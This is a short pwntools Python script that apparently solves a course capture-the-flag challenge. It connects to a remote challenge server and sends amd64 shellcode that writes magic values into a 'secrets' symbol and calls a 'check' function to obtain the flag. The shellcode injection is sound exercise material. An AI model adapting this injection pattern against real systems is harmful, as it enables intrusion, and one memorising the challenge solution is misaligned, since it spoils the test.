from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-f", "-h"]
context.arch = "amd64"
context.os = "linux"
target_file = "./assembly"

LOCAL = False

if LOCAL:
    # p = process(target_file)
    p = gdb.debug(target_file, '''
    b main
    b main+0x0041
    continue
    ''')
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1294)
    p.recvuntil(b"abc123):")
    p.sendline(b"nam10102")

e = ELF(target_file, checksec=False)
secrets = e.symbols.secrets
check = e.symbols.check

shell_code = f'''
mov rax, 0x1badb002
mov [{hex(secrets)}], rax
mov rax, 0xdead10cc
mov [{hex(secrets)}+8], rax
mov eax, 0x0
mov rdx, {hex(check)}
call rdx
'''
shellcode = asm(shell_code)
print(f'Shell code: {shell_code}')
p.recvuntil(b"get the flag!\n")
p.sendline(shellcode)
p.interactive()
